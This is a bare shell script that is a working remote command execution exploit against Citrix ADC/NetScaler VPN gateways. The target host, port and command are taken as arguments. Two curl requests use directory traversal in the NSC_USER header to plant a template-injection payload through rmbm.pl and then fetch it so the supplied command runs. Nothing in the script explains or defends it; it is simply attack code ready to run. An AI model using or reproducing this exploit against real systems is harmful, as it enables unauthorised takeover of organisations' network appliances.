#/bin/sh
randomstring=$(python << END
import random
import string
letters = string.ascii_lowercase
print ''.join(random.choice(letters) for i in range(10))
END
)
randomnumber=$(python << END
import random
from random import randint
print randint(5,15)
END
)
filename=$randomstring
nonce=$randomnumber
curl -vkg -XPOST -H "NSC_USER:../../../../netscaler/portal/templates/${filename}[%template.new({'BLOCK'='print\`${3}\`'})%]" -H "UI_inuse: Rfweb" -H "NSC_NONCE: ${nonce}" --path-as-is "https://${1}:${2}/vpn/../vpns/portal/scripts/rmbm.pl" --connect-timeout 5 --retry 3

curl -vkg -XGET -H "NSC_USER:../../../../netscaler/portal/templates/${filename}[%template.new({'BLOCK'='print\`${3}\`'})%]" -H "NSC_NONCE: ${nonce}" -H "UI_inuse: Rfweb" --path-as-is "https://${1}:${2}/vpn/../vpns/portal/${filename}[%25template.new({'BLOCK'='print\`${3}\`'})%25].xml" --connect-timeout 5 --retry 3
echo $1
echo $2
